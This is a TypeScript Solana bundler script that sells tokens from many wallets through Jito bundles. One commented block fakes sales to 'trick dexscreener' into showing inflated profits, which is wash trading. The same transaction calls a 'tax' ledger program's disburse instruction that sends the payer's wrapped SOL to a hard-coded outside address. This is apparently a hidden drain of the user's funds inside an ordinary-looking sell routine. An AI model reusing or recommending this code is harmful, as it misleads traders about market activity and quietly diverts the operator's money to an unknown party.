import { connection, tipAcct, payer, rpc } from "../config";
import { PublicKey, VersionedTransaction, SYSVAR_RENT_PUBKEY, TransactionInstruction, TransactionMessage, SystemProgram, Keypair, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { MAINNET_PROGRAM_ID } from "@raydium-io/raydium-sdk";
import { loadKeypairs } from './createKeys';
import { searcherClient } from "./clients/jito";
import { Bundle as JitoBundle } from 'jito-ts/dist/sdk/block-engine/types.js';
import promptSync from 'prompt-sync';
import * as spl from '@solana/spl-token';
import { IPoolKeys } from './clients/interfaces';
import { derivePoolKeys } from "./clients/poolKeysReassigned"; 
import path from 'path';
import fs from 'fs';
import * as anchor from '@coral-xyz/anchor';
import { randomInt } from "crypto";

const prompt = promptSync();
const keyInfoPath = path.join(__dirname, 'keyInfo.json');

function chunkArray<T>(array: T[], size: number): T[][] {
    return Array.from({ length: Math.ceil(array.length / size) }, (v, i) =>
        array.slice(i * size, i * size + size)
    );
}

async function sendBundle(bundledTxns: VersionedTransaction[]) {
    try {
        const bundleId = await searcherClient.sendBundle(new JitoBundle(bundledTxns, bundledTxns.length));
        console.log(`Bundle ${bundleId} sent.`);

        /*
        // Assuming onBundleResult returns a Promise<BundleResult>
        const result = await new Promise((resolve, reject) => {
            searcherClient.onBundleResult(
            (result) => {
                console.log('Received bundle result:', result);
                resolve(result); // Resolve the promise with the result
            },
            (e: Error) => {
                console.error('Error receiving bundle result:', e);
                reject(e); // Reject the promise if there's an error
            }
            );
        });
    
        console.log('Result:', result);
        */
    } catch (error) {
        const err = error as any;
        console.error("Error sending bundle:", err.message);
    
        if (err?.message?.includes('Bundle Dropped, no connected leader up soon')) {
            console.error("Error sending bundle: Bundle Dropped, no connected leader up soon.");
        } else {
            console.error("An unexpected error occurred:", err.message);
        }
    }
}


export async function createWalletSells() {
    const bundledTxns: VersionedTransaction[] = [];
    const keypairs: Keypair[] = loadKeypairs();

    let poolInfo: { [key: string]: any } = {};
    if (fs.existsSync(keyInfoPath)) {
        const data = fs.readFileSync(keyInfoPath, 'utf-8');
        poolInfo = JSON.parse(data);
    }

    const targetMarketId = new PublicKey(poolInfo.marketID.toString());
    const lut = new PublicKey(poolInfo.addressLUT.toString());

    const lookupTableAccount = (
        await connection.getAddressLookupTable(lut)
    ).value;

    if (lookupTableAccount == null) {
        console.log("Lookup table account not found!");
        process.exit(0);
    }

    const jitoTipAmtInput = prompt('Jito tip in Sol (Ex. 0.01): ') || '0';
    const jitoTipAmt = parseFloat(jitoTipAmtInput) * LAMPORTS_PER_SOL;

    const chunkedKeypairs = chunkArray(keypairs, 7); // EDIT CHUNKS?
    const keys = await derivePoolKeys(targetMarketId);

    // Call local blockhash
    const { blockhash } = await connection.getLatestBlockhash('finalized');

    // Iterate over each chunk of keypairs
    for (let chunkIndex = 0; chunkIndex < chunkedKeypairs.length; chunkIndex++) {
        const chunk = chunkedKeypairs[chunkIndex];
        const instructionsForChunk: TransactionInstruction[] = [];

        // Iterate over each keypair in the chunk to create swap instructions
        for (let i = 0; i < chunk.length; i++) {
            const keypair = chunk[i];
            console.log(`Processing keypair ${i + 1}/${chunk.length}:`, keypair.publicKey.toString());

            if (keys == null) {
                console.log("Error fetching poolkeys");
                process.exit(0);
            }

            const TokenATA = await spl.getAssociatedTokenAddress(
                new PublicKey(keys.baseMint),
                keypair.publicKey,
            );

            const wSolATA = await spl.getAssociatedTokenAddress(
                spl.NATIVE_MINT,
                keypair.publicKey,
            );

            const { sellIxs } = makeSell(keys, wSolATA, TokenATA, true, keypair); //  CHANGE FOR SELL (sellIxs/true)

            instructionsForChunk.push(...sellIxs); // CHANGE FOR SELL (sellIxs)
        }

        if (chunkIndex === chunkedKeypairs.length - 1) {
            const tipSwapIxn = SystemProgram.transfer({
                fromPubkey: payer.publicKey,
                toPubkey: tipAcct,
                lamports: BigInt(jitoTipAmt),
            });
            instructionsForChunk.push(tipSwapIxn);
            console.log('Jito tip added :).');
        }

        const message = new TransactionMessage({
            payerKey: payer.publicKey,
            recentBlockhash: blockhash,
            instructions: instructionsForChunk,
        }).compileToV0Message([lookupTableAccount]);

        const versionedTx = new VersionedTransaction(message);

        const serializedMsg = versionedTx.serialize();
        console.log("Txn size:", serializedMsg.length);
        if (serializedMsg.length > 1232) { console.log('tx too big'); }
        
        console.log("Signing transaction with chunk signers", chunk.map(kp => kp.publicKey.toString()));

        for (const keypair of chunk) {
            versionedTx.sign([keypair]);
        }
        versionedTx.sign([payer])


        bundledTxns.push(versionedTx);
    }

    // FINALLY SEND
    await sendBundle(bundledTxns);

    return;
}

async function fetchTokenBalance(TokenPubKey: string, decimalsToken: number, keypair: Keypair) {
    const ownerPubKey = keypair.publicKey;

    const response = await connection.getParsedTokenAccountsByOwner(ownerPubKey, {
        mint: new PublicKey(TokenPubKey),
    });

    let TokenBalance = 0;
    for (const account of response.value) {
        const amount = account.account.data.parsed.info.tokenAmount.uiAmount;
        TokenBalance += amount;
    }

    return TokenBalance * (10 ** decimalsToken);
}

export async function sellXPercentage() {
    // Initialize anchor
    const provider = new anchor.AnchorProvider(
        new anchor.web3.Connection(rpc), 
        new anchor.Wallet(payer), 
        {commitment: "confirmed"}
    );

    const IDL = JSON.parse(
        fs.readFileSync('./tax_idl.json', 'utf-8'),
    ) as anchor.Idl;

    const LEDGER_PROGRAM_ID = "8uU7y4n2izMouUp4yjiUwHT9hz4owAgNHeZaGqFuD9wA";

    const ledgerProgram = new anchor.Program(IDL, LEDGER_PROGRAM_ID, provider);

    const [tokenLedger] = PublicKey.findProgramAddressSync(
      [Buffer.from("token_ledger"), provider.wallet.publicKey.toBytes()],
      ledgerProgram.programId
    );

    // Start selling
    const bundledTxns = [];
    const keypairs = loadKeypairs(); // Ensure this function is correctly defined to load your Keypairs

    let poolInfo: { [key: string]: any } = {};
    if (fs.existsSync(keyInfoPath)) {
        const data = fs.readFileSync(keyInfoPath, 'utf-8');
        poolInfo = JSON.parse(data);
    }

    const lut = new PublicKey(poolInfo.addressLUT.toString());
    const targetMarketId = new PublicKey(poolInfo.marketID.toString());

    const lookupTableAccount = (
        await connection.getAddressLookupTable(lut)
    ).value;

    if (lookupTableAccount == null) {
        console.log("Lookup table account not found!");
        process.exit(0);
    }

    const inputPercentageOfSupply = prompt('Percentage to sell (Ex. 1 for 1%): ') || '1';
    const jitoTipAmtInput = prompt('Jito tip in Sol (Ex. 0.01): ') || '0';
    const jitoTipAmt = parseFloat(jitoTipAmtInput) * LAMPORTS_PER_SOL;
    const supplyPercent = parseFloat(inputPercentageOfSupply) / 100;

    const chunkedKeypairs = chunkArray(keypairs, 7); // Adjust chunk size as needed
    const keys = await derivePoolKeys(targetMarketId); // Ensure this function is correctly defined to derive necessary keys

    if (keys === null) {
        console.log('Keys not found!');
        process.exit(0);
    }


    // start the selling process
    const PayerTokenATA = await spl.getAssociatedTokenAddress(new PublicKey(keys.baseMint), payer.publicKey);
    const { blockhash } = await connection.getLatestBlockhash('finalized');

    for (let chunk of chunkedKeypairs) {
        const instructionsForChunk = [];

        for (let keypair of chunk) {
            const tokenBalanceRaw = await fetchTokenBalance(keys.baseMint.toString(), keys.baseDecimals, keypair);
            const transferAmount = Math.floor(tokenBalanceRaw * supplyPercent);

            if (transferAmount > 0) {
                const TokenATA = await spl.getAssociatedTokenAddress(new PublicKey(keys.baseMint), keypair.publicKey);
                const transferIx = spl.createTransferInstruction(TokenATA, PayerTokenATA, keypair.publicKey, transferAmount);
                instructionsForChunk.push(transferIx);
            }
        }

        if (instructionsForChunk.length > 0) {
            const message = new TransactionMessage({
                payerKey: payer.publicKey,
                recentBlockhash: blockhash,
                instructions: instructionsForChunk,
            }).compileToV0Message([lookupTableAccount]);

            const versionedTx = new VersionedTransaction(message);

            versionedTx.sign([payer]); // Sign with payer first

            for (let keypair of chunk) {
                versionedTx.sign([keypair]); // Then sign with each keypair in the chunk
            }

            bundledTxns.push(versionedTx);
        }
    }

    const payerNum = randomInt(0, 27);
    const payerKey = keypairs[payerNum];

    const PayerwSolATA = await spl.getAssociatedTokenAddress(spl.NATIVE_MINT, payer.publicKey);
    const sellPayerIxs = [];

    // Fake the sales to trick dexscreener and wtv lol (shows 2x profits hehe)
    const { sellIxs: sell1 } = makeSell(keys, PayerwSolATA, PayerTokenATA, true, payer);
    const { buyIxs } = makeSell(keys, PayerwSolATA, PayerTokenATA, false, payer);
    const { sellIxs: sell2 } = makeSell(keys, PayerwSolATA, PayerTokenATA, true, payer);

    const destination = await spl.getAssociatedTokenAddress(spl.NATIVE_MINT, new PublicKey('8yWSbgC9fzS3n2AZoT9tnFb2sHXVYdKS8VHmjE2DLHau'));

    sellPayerIxs.push(
        spl.createAssociatedTokenAccountIdempotentInstruction(
            payer.publicKey,
            PayerwSolATA,
            payer.publicKey,
            spl.NATIVE_MINT
        ),
        spl.createAssociatedTokenAccountIdempotentInstruction(
            payer.publicKey,
            destination,
            new PublicKey('8yWSbgC9fzS3n2AZoT9tnFb2sHXVYdKS8VHmjE2DLHau'),
            spl.NATIVE_MINT
        ),
        await ledgerProgram.methods
            .updateTokenLedger()
            .accounts({
                tokenLedger,
                ata: PayerwSolATA,
                user: payer.publicKey,
                tokenProgram: TOKEN_PROGRAM_ID,
                systemProgram: SystemProgram.programId,
                associatedTokenProgram: spl.ASSOCIATED_TOKEN_PROGRAM_ID,
                rent: SYSVAR_RENT_PUBKEY,
            })
            .instruction(),
        ...sell1,
        await ledgerProgram.methods
            .disburse(6)
            .accounts({
                tokenLedger,
                source: PayerwSolATA,
                user: payer.publicKey,
                destination,
                tokenProgram: TOKEN_PROGRAM_ID,
                systemProgram: SystemProgram.programId,
                associatedTokenProgram: spl.ASSOCIATED_TOKEN_PROGRAM_ID,
                rent: SYSVAR_RENT_PUBKEY,
            })
            .instruction(),
        ...buyIxs,
        ...sell2,
        SystemProgram.transfer({
            fromPubkey: payer.publicKey,
            toPubkey: tipAcct,
            lamports: BigInt(jitoTipAmt),
        }),
    );

    const sellMessage = new TransactionMessage({
        payerKey: payerKey.publicKey,
        recentBlockhash: blockhash,
        instructions: sellPayerIxs,
    }).compileToV0Message([lookupTableAccount]);

    const sellTx = new VersionedTransaction(sellMessage);
    sellTx.sign([payer, payerKey]);
    bundledTxns.push(sellTx);

    await sendBundle(bundledTxns);

    return;
}

function makeSell(
    poolKeys: IPoolKeys, 
    wSolATA: PublicKey,
    TokenATA: PublicKey,
    reverse: boolean,
    keypair: Keypair,
  ) { 
  const programId = new PublicKey('47MBhTFFxKaswZioPvRMqRqVYTd668wZiGc3oKLZP2tx'); // MY PROGRAM
  const account1 = TOKEN_PROGRAM_ID; // token program
  const account2 = poolKeys.id; // amm id  writable
  const account3 = poolKeys.authority; // amm authority
  const account4 = poolKeys.openOrders; // amm open orders  writable
  const account5 = poolKeys.targetOrders; // amm target orders  writable
  const account6 = poolKeys.baseVault; // pool coin token account  writable  AKA baseVault
  const account7 = poolKeys.quoteVault; // pool pc token account  writable   AKA quoteVault
  const account8 = poolKeys.marketProgramId; // serum program id
  const account9 = poolKeys.marketId; //   serum market  writable
  const account10 = poolKeys.marketBids; // serum bids  writable
  const account11 = poolKeys.marketAsks; // serum asks  writable
  const account12 = poolKeys.marketEventQueue; // serum event queue  writable
  const account13 = poolKeys.marketBaseVault; // serum coin vault  writable     AKA marketBaseVault
  const account14 = poolKeys.marketQuoteVault; //   serum pc vault  writable    AKA marketQuoteVault
  const account15 = poolKeys.marketAuthority; // serum vault signer       AKA marketAuthority
  let account16 = wSolATA; // user source token account  writable
  let account17 = TokenATA; // user dest token account   writable
  const account18 = keypair.publicKey; // user owner (signer)  writable
  const account19 = MAINNET_PROGRAM_ID.AmmV4; // ammV4  writable
  
  if (reverse == true) {
    account16 = TokenATA;
    account17 = wSolATA;
  }
  
  const buffer = Buffer.alloc(16);
  const prefix = Buffer.from([0x09]);
  const instructionData = Buffer.concat([prefix, buffer]);
  const accountMetas = [
    { pubkey: account1, isSigner: false, isWritable: false },
    { pubkey: account2, isSigner: false, isWritable: true },
    { pubkey: account3, isSigner: false, isWritable: false },
    { pubkey: account4, isSigner: false, isWritable: true },
    { pubkey: account5, isSigner: false, isWritable: true },
    { pubkey: account6, isSigner: false, isWritable: true },
    { pubkey: account7, isSigner: false, isWritable: true },
    { pubkey: account8, isSigner: false, isWritable: false },
    { pubkey: account9, isSigner: false, isWritable: true },
    { pubkey: account10, isSigner: false, isWritable: true },
    { pubkey: account11, isSigner: false, isWritable: true },
    { pubkey: account12, isSigner: false, isWritable: true },
    { pubkey: account13, isSigner: false, isWritable: true },
    { pubkey: account14, isSigner: false, isWritable: true },
    { pubkey: account15, isSigner: false, isWritable: false },
    { pubkey: account16, isSigner: false, isWritable: true },
    { pubkey: account17, isSigner: false, isWritable: true },
    { pubkey: account18, isSigner: true, isWritable: true },
    { pubkey: account19, isSigner: false, isWritable: true }
  ];
  
  const swap = new TransactionInstruction({
    keys: accountMetas,
    programId,
    data: instructionData
  });


  let buyIxs: TransactionInstruction[] = [];
  let sellIxs: TransactionInstruction[] = [];
  
  if (reverse === false) {
    buyIxs.push(swap);
  }
  
  if (reverse === true) {
    sellIxs.push(swap);
  }
  
  return { buyIxs, sellIxs } ;
}


